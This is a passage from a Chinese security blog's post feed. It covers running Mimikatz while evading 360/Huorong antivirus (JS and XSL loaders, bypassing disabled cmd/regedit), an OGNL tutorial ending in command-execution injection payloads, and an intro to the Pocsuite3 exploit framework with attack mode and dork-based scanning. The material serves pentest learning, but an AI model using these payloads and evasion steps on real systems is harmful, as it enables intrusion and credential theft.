
<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103203026847.png" class title="image-20211103203026847">

<p>360和火绒都没有报毒和进行拦截</p>
<h3 id="js加载mimikatz"><a href="#js加载mimikatz" class="headerlink" title="js加载mimikatz"></a>js加载mimikatz</h3><p>下载<a href="https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js">katz.js</a>，执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scsript mimikatz.js</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204511543.png" class title="image-20211103204511543">



<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204537821.png" class title="image-20211103204537821">

<p>360拦截了，火绒没绕过</p>
<h3 id="jscript的xsl版"><a href="#jscript的xsl版" class="headerlink" title="jscript的xsl版"></a>jscript的xsl版</h3><p>本地加载mimikatz.xsl文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic os get /format:&quot;mimikatz.xsl&quot;</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204250467.png" class title="image-20211103204250467">

<p>360和火绒都没有拦截</p>
<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><hr>
<h3 id="导出chrome中的密码"><a href="#导出chrome中的密码" class="headerlink" title="导出chrome中的密码"></a>导出chrome中的密码</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd">使用mimikatz导出chrome中的密码 (qq.com)</a></p>
<h3 id="隐藏功能"><a href="#隐藏功能" class="headerlink" title="隐藏功能"></a>隐藏功能</h3><p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>内网渗透</category>
        <category>渗透工具</category>
      </categories>
      <tags>
        <tag>-内网渗透 -工具使用 -免杀处理</tag>
      </tags>
  </entry>
  <entry>
    <title>OGNL表达式</title>
    <url>/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="OGNL表达式"><a href="#OGNL表达式" class="headerlink" title="OGNL表达式"></a>OGNL表达式</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>OGNL是Object Graphic Navigation Language(对象图导航语言)的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。Struts框架使用OGNL作为默认的表达式语言</p>
<h3 id="三要素"><a href="#三要素" class="headerlink" title="三要素"></a>三要素</h3><p>首先来介绍下 OGNL 的三要素：</p>
<ul>
<li><p><strong>表达式（Expression）</strong>：</p>
<p>表达式是整个 OGNL 的核心内容，所有的 OGNL 操作都是针对表达式解析后进行的。通过表达式来告诉 OGNL 操作到底要干些什么。因此，表达式其实是一个带有语法含义的字符串，整个字符串将规定操作的类型和内容。OGNL 表达式支持大量的表达式，如 “链式访问对象”、表达式计算、甚至还支持 Lambda 表达式。</p>
</li>
<li><p><strong>Root 对象</strong>：</p>
<p>OGNL 的 Root 对象可以理解为 OGNL 的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是 Root 对象，这就意味着，如果有一个 OGNL 表达式，那么我们需要针对 Root 对象来进行 OGNL 表达式的计算并且返回结果。</p>
</li>
<li><p><strong>上下文环境</strong>：</p>
<p>有个 Root 对象和表达式，我们就可以使用 OGNL 进行简单的操作了，如对 Root 对象的赋值与取值操作。但是，实际上在 OGNL 的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。Root 对象也会被添加到上下文环境当中去。</p>
<p>说白了上下文就是一个 MAP 结构，它实现了 java.utils.Map 的接口。</p>
</li>
</ul>
<h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ul>
<li>支持对象方法调用，如：×××.doSomeSpecial();</li>
<li>支持类静态的方法调用和值访问，表达式的格式</li>
</ul>
<blockquote>
<p>@[类全名（包括包路径）]@[方法名 |  值名]，例如：<br>@java.lang.String@format(‘foo %s’, ‘bar’)<br>或@tutorial.MyConstant@APP_NAME；</p>
</blockquote>
<ul>
<li>支持赋值操作和表达式串联，</li>
</ul>
<blockquote>
<p>如price&#x3D;100, discount&#x3D;0.8,calculatePrice()，这个表达式会返回80；</p>
</blockquote>
<ul>
<li>访问OGNL上下文（OGNL context）和ActionContext；</li>
<li>操作（创建）集合对象。</li>
</ul>
<p><strong>总结：</strong>OGNL 有一个上下文（Context）概念，说白了上下文就是一个MAP结构，它实现了java.utils.Map 的接口。</p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul>
<li>jsp页面取值用</li>
<li>EL表达式语言，也用于页面取值，是jsp页面取值的标准（默认就可以使用）</li>
<li>Ognl表达式语言，Struts标签默认支持的表达式语言，必须配置Struts标签用，不能离开Struts标签直接使用，就是说Ognl必须在Struts中使用</li>
<li>对比来看，EL使用范围更广，项目中不限制使用哪一种，哪一种熟悉就使用哪一种</li>
</ul>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>#、%和$符号在OGNL表达式中经常出现，这里简单介绍一下三种表达式的用途</p>
<h3 id="符号"><a href="#符号" class="headerlink" title="#符号"></a>#符号</h3><p>#符号的三种用法:</p>
<p>  1）访问非根对象属性，例如示例中的#session.msg表达式，由于Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀。实际上，#相当于ActionContext. getContext()；#session.msg表达式相当于ActionContext.getContext().getSession(). getAttribute(“msg”) 。</p>
<p>  2）用于过滤和投影（projecting）集合，如示例中的persons.{?#this.age&gt;20}。</p>
<p> 3） 用来构造Map，例如示例中的#{‘foo1’:’bar1’, ‘foo2’:’bar2’}。</p>
<h3 id="符号-1"><a href="#符号-1" class="headerlink" title="%符号"></a>%符号</h3><p> %符号的用途是在标志的属性为字符串类型时，告诉执行环境‘%{}’中的是 OGNL 表达式，计算OGNL表达式的值。</p>
<h3 id="符号-2"><a href="#符号-2" class="headerlink" title="$符号"></a>$符号</h3><p>$符号主要有两个方面的用途。</p>
<p>  1） 在国际化资源文件中，引用OGNL表达式，例如国际化资源文件中的代码：reg.agerange&#x3D;国际化资源信息：年龄必须在</p>
<p>${min}同${max}之间。</p>
<p>  2） 在Struts 2框架的配置文件中引用OGNL表达式，例如下面的代码片断所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10100BAction-test校验：数字必须为$&#123;min&#125;为$&#123;max&#125;之间！</span><br></pre></td></tr></table></figure>

<h3 id="和-和-的区别"><a href="#和-和-的区别" class="headerlink" title="#和.和@的区别"></a>#和.和@的区别</h3><ul>
<li>获取静态函数和变量的时候用@</li>
<li>获取非静态函数用.号获取</li>
<li>获取非静态变量用#获取</li>
</ul>
<h2 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h2><p>Pom.xml添加依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;ognl&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;ognl&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.1.11&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.16.10&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<h3 id="对Root对象的访问"><a href="#对Root对象的访问" class="headerlink" title="对Root对象的访问"></a>对Root对象的访问</h3><p>OGNL 使用的是一种链式的风格进行对象的访问，中间使用<code>.</code>进行连接；所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">OgnlTest</span> &#123;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">static</span> <span class="title">void</span> <span class="title">main</span>(<span class="params">String[] args</span>) <span class="title">throws</span> <span class="title">OgnlException</span> &#123;</span></span><br><span class="line"><span class="class">        <span class="title">User</span> <span class="title">user</span> = <span class="title">new</span> <span class="title">User</span>();</span></span><br><span class="line"><span class="class">        <span class="title">user</span>.<span class="title">setAge</span>(<span class="params"><span class="number">16</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">user</span>.<span class="title">setName</span>(<span class="params"><span class="string">&quot;hello&quot;</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">Info</span> <span class="title">info</span> = <span class="title">new</span> <span class="title">Info</span>(<span class="params"><span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">user</span>.<span class="title">setInfo</span>(<span class="params">info</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">Ognl.getValue(<span class="params"><span class="string">&quot;age&quot;</span>, user</span>)</span>);    // 16</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">Ognl.getValue(<span class="params"><span class="string">&quot;name&quot;</span>, user</span>)</span>);    // <span class="title">hello</span></span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">Ognl.getValue(<span class="params"><span class="string">&quot;name.length&quot;</span>, user</span>)</span>);    // 5</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">Ognl.getValue(<span class="params"><span class="string">&quot;info&quot;</span>, user</span>)</span>);    // <span class="title">Info</span>(<span class="params">a=<span class="number">1</span>, b=<span class="number">2</span></span>)</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">Ognl.getValue(<span class="params"><span class="string">&quot;info.a&quot;</span>, user</span>)</span>);    // 1</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">Data</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">User</span> &#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">String</span> <span class="title">name</span>;</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">int</span> <span class="title">age</span>;</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">Info</span> <span class="title">info</span>;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">Data</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Info</span> &#123;</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">String</span> <span class="title">a</span>;</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">String</span> <span class="title">b</span>;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">Info</span>(<span class="params">String a, String b</span>)&#123;</span></span><br><span class="line"><span class="class">        <span class="title">this</span>.<span class="title">a</span> = <span class="title">a</span>;</span></span><br><span class="line"><span class="class">        <span class="title">this</span>.<span class="title">b</span> = <span class="title">b</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314164047684.png" class title="image-20220314164047684">



<h3 id="对上下文对象的访问"><a href="#对上下文对象的访问" class="headerlink" title="对上下文对象的访问"></a>对上下文对象的访问</h3><p>使用 OGNL 的时候如果不设置上下文对象，系统会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象则会使用传入的上下文对象。</p>
<p>当访问上下文环境当中的参数时候，需要在表达式前面加上 ‘#’ ，表示了与访问 Root 对象的区别。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import lombok.Data;</span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class OgnlTest1 &#123;</span><br><span class="line">    public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">        User1 user = new User1();</span><br><span class="line">        user.setAge(16);</span><br><span class="line">        user.setName(&quot;hello&quot;);</span><br><span class="line">        Info1 info = new Info1(&quot;1&quot;,&quot;2&quot;);</span><br><span class="line">        user.setInfo(info);</span><br><span class="line"></span><br><span class="line">        Map context = new HashMap();</span><br><span class="line">        context.put(&quot;test&quot;, &quot;testValue&quot;);</span><br><span class="line">        context.put(&quot;aaa&quot;, user);</span><br><span class="line"></span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#test&quot;, context, user));  // testValue</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#aaa&quot;, context, user));  // User(name=hello, age=16, info=Info(a=1, b=2))</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#aaa.name&quot;, context, user)); // hello</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">class User1 &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    private Info1 info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">class Info1 &#123;</span><br><span class="line">    private String a;</span><br><span class="line">    private String b;</span><br><span class="line"></span><br><span class="line">    public Info1(String a, String b)&#123;</span><br><span class="line">        this.a = a;</span><br><span class="line">        this.b = b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314164739479.png" class title="image-20220314164739479">

<h3 id="对静态变量的访问"><a href="#对静态变量的访问" class="headerlink" title="对静态变量的访问"></a>对静态变量的访问</h3><p>在 OGNL 表达式当中也可以访问静态变量或者调用静态方法，格式如 <code>@[class]@[field/method()]</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">public class OgnlTest3 &#123;</span><br><span class="line">    public static String test = &quot;This is a test!!!!!&quot;;</span><br><span class="line">            public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">                System.out.println(Ognl.getValue(&quot;@org.example.OgnlTest3@test&quot;,null));</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314165425968.png" class title="image-20220314165425968">

<h3 id="方法的调用"><a href="#方法的调用" class="headerlink" title="方法的调用"></a>方法的调用</h3><p>如果需要调用 Root 对象或者上下文对象当中的方法也可以使用类似的方式来调用。甚至可以传入参数。</p>
<p>赋值的时候可以选择上下文当中的元素进行给 Root 对象的 name 属性赋值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import lombok.Data;</span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class OgnlTest4 &#123;</span><br><span class="line">    public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">        User4 user = new User4();</span><br><span class="line">        Map context = new HashMap();</span><br><span class="line">        context.put(&quot;test&quot;, &quot;testValue&quot;);</span><br><span class="line">        context.put(&quot;aaa&quot;, user);</span><br><span class="line"></span><br><span class="line">        System.out.println(Ognl.getValue(&quot;getName()&quot;, context, user));  // null</span><br><span class="line">        Ognl.getValue(&quot;setName(#test)&quot;, context, user); // 执行setName方法</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;getName()&quot;, context, user));  // testValue</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">class User4 &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314165803652.png" class title="image-20220314165803652">



<h3 id="对数组和集合的访问"><a href="#对数组和集合的访问" class="headerlink" title="对数组和集合的访问"></a>对数组和集合的访问</h3><p>OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class OgnlTest5 &#123;</span><br><span class="line">    public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">        List list = new ArrayList&lt;&gt;();</span><br><span class="line">        list.add(&quot;123&quot;);</span><br><span class="line">        list.add(&quot;456&quot;);</span><br><span class="line"></span><br><span class="line">        Map map = new HashMap();</span><br><span class="line">        map.put(&quot;test1&quot;, &quot;value1&quot;);</span><br><span class="line"></span><br><span class="line">        Map context = new HashMap();</span><br><span class="line">        context.put(&quot;list&quot;, list);</span><br><span class="line">        context.put(&quot;map&quot;, map);</span><br><span class="line"></span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#list[0]&quot;, context, list));   // 123</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#map[&#x27;test1&#x27;]&quot;, context, map));   // value1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314170208984.png" class title="image-20220314170208984">

<h3 id="投影与选择"><a href="#投影与选择" class="headerlink" title="投影与选择"></a>投影与选择</h3><ul>
<li><p><strong>投影</strong>：选出集合当中的相同属性组合成一个新的集合。语法为 collection.{XXX}，XXX 就是集合中每个元素的公共属性。</p>
</li>
<li><p><strong>选择</strong>：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为 collection.{Y XXX}，其中 Y 是一个选择操作符，XXX 是选择用的逻辑表达式。</p>
<p>选择操作符有 3 种：</p>
<ul>
<li>? ：选择满足条件的所有元素</li>
<li>^：选择满足条件的第一个元素</li>
<li>$：选择满足条件的最后一个元素</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import lombok.Data;</span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class OgnlTest6 &#123;</span><br><span class="line">    public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">        User6 u1 = new User6(&quot;name1&quot;, 11);</span><br><span class="line">        User6 u2 = new User6(&quot;name2&quot;, 22);</span><br><span class="line">        User6 u3 = new User6(&quot;name3&quot;, 33);</span><br><span class="line">        User6 u4 = new User6(&quot;name4&quot;, 44);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;User6&gt; list = new ArrayList&lt;User6&gt;();</span><br><span class="line">        list.add(u1);</span><br><span class="line">        list.add(u2);</span><br><span class="line">        list.add(u3);</span><br><span class="line">        list.add(u4);</span><br><span class="line"></span><br><span class="line">        Map context = new HashMap();</span><br><span class="line">        context.put(&quot;list&quot;, list);</span><br><span class="line"></span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#list.&#123;age&#125;&quot;, context, list));    // [11, 22, 33, 44]</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#list.&#123;? #this.age &gt; 22&#125;&quot;, context, list));   // [User(name=name3, age=33), User(name=name4, age=44)]</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#list.&#123;^ #this.age &gt; 22&#125;&quot;, context, list));   // [User(name=name3, age=33)]</span><br><span class="line">        System.out.println(Ognl.getValue(&quot;#list.&#123;$ #this.age &gt; 22&#125;&quot;, context, list));   // [User(name=name4, age=44)]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">class User6 &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public User6(String name, int age) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314170821547.png" class title="image-20220314170821547">

<h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><p>OGNL 支持直接使用表达式来创建对象。主要有三种情况：</p>
<ul>
<li>构造 List 对象：使用 {}, 中间使用 ‘,’ 进行分割如 {“aa”, “bb”, “cc”}</li>
<li>构造 Map 对象：使用 #{}，中间使用 ‘, 进行分割键值对，键值对使用 ‘:’ 区分，如 #{“key1” : “value1”, “key2” : “value2”}</li>
<li>构造任意对象：直接使用已知的对象的构造方法进行构造。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(Ognl.getValue(&quot;&#123;&#x27;key1&#x27;,&#x27;value1&#x27;&#125;&quot;, null));    // [key1, value1]</span><br><span class="line">System.out.println(Ognl.getValue(&quot;#&#123;&#x27;key1&#x27;:&#x27;value1&#x27;&#125;&quot;, null));    // &#123;key1=value1&#125;</span><br><span class="line">System.out.println(Ognl.getValue(&quot;new java.lang.String(&#x27;123&#x27;)&quot;, null));    // 123</span><br></pre></td></tr></table></figure>



<h2 id="OGNL表达式注入"><a href="#OGNL表达式注入" class="headerlink" title="OGNL表达式注入"></a>OGNL表达式注入</h2><p>对于OGNL表达式注入，在Struts2.x中漏洞频出，通过构造payload调用系统命令执行。OGNL可以访问静态方法、属性和对象方法等，其中包括可执行恶意操作的命令执行类java.lang.Runtime等，当OGNL表达式输入外部可控时，就可以构造恶意payload造成命令执行。</p>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>调用java.lang.Runtime类中的getRuntime().exec()方法，调用格式@{Class}@{Method}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import ognl.Ognl;</span><br><span class="line">import ognl.OgnlException;</span><br><span class="line"></span><br><span class="line">public class Ognlexec &#123;</span><br><span class="line">    public static void main(String[] args) throws OgnlException &#123;</span><br><span class="line">        String payload=&quot;@java.lang.Runtime@getRuntime().exec(&#x27;calc.exe&#x27;)&quot;;</span><br><span class="line">        System.out.println(Ognl.getValue(payload,null));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<img src="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220314172440717.png" class title="image-20220314172440717">

<h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取context里面的变量值</span><br><span class="line"> #user</span><br><span class="line"> #user.name</span><br><span class="line"></span><br><span class="line">//使用runtime执行系统命令</span><br><span class="line">@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line">//使用processbuilder执行系统命令</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span><br><span class="line"></span><br><span class="line">//获取当前绝对路径</span><br><span class="line">@java.lang.System@getProperty(&quot;user.dir&quot;)</span><br><span class="line"></span><br><span class="line">// e-mobole带回显</span><br><span class="line">@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内功心法</category>
        <category>java表达式</category>
      </categories>
      <tags>
        <tag>-OGNL -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Pocsuite使用及Poc编写</title>
    <url>/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h1 id="Pocsuite-使用及Poc编写"><a href="#Pocsuite-使用及Poc编写" class="headerlink" title="Pocsuite 使用及Poc编写"></a>Pocsuite 使用及Poc编写</h1><hr>
<h2 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h2><p>PocSuite是由知道创宇 404 实验室编写的一款基于 python 的开源漏洞利用框架。PocSuite 包含漏洞检测和利用两种模式，可以针对特定漏洞对多个目标进行探测并返回漏洞检测及利用的结果。</p>
<p>下载地址: <a href="https://github.com/knownsec/pocsuite3">https://github.com/knownsec/pocsuite3</a></p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207143045516.png" class title="image-20220207143045516">



<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>Pocsuite的使用可以通过两种方式进行，一种是直接在输入命令时指定poc文件和线程数量进行探测，另外一种是设置pocsuite.ini文件命令行默认运行。</p>
<h3 id="指定文件探测"><a href="#指定文件探测" class="headerlink" title="指定文件探测"></a>指定文件探测</h3><p>举例: 使用ZoomEye搜索ecshop并使用ecshop_rce.py探测，指定线程数量为5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 cli.py --r pocs/ecshop_rce.py --dork ecshop  --threads 5</span><br><span class="line"></span><br><span class="line">#--r            指定需要使用的poc文件</span><br><span class="line">#--dork         指定搜索引擎搜索的内容(Zoomeye,shodan......)</span><br><span class="line">#--max-page     ZoomEye API 的请求翻页数（10 目标/页）</span><br><span class="line">#--search-type  ZoomEye API搜索类型，web 或者 host</span><br><span class="line">#--vul-keyword  Seebug 搜索关键词，用于在Seebug 搜索漏洞POC</span><br><span class="line">#--threads      指定线程数量</span><br></pre></td></tr></table></figure>

<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207150558967.png" class title="image-20220207150558967">



<p><strong>verify模式</strong></p>
<p>验证目标是否存在漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单个目标验证：</span><br><span class="line">pocsuite -r tests/poc_example.py -u http://www.example.com/ --verify</span><br><span class="line"></span><br><span class="line">批量文件验证:</span><br><span class="line">pocsuite -r test/poc_example.py -f url.txt --verify</span><br><span class="line"></span><br><span class="line">扫描器（使用目录下的所有Poc对目标进行测试）:</span><br><span class="line">pocsuite -r tests/ -u http://www.example.com --verify</span><br></pre></td></tr></table></figure>





<p><strong>attack模式</strong></p>
<p>向存在漏洞的目标进行漏洞利用攻击。(用法和verify模式相同)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pocsuite -r tests/poc_example.py -u http://www.example.com/ --attack</span><br></pre></td></tr></table></figure>





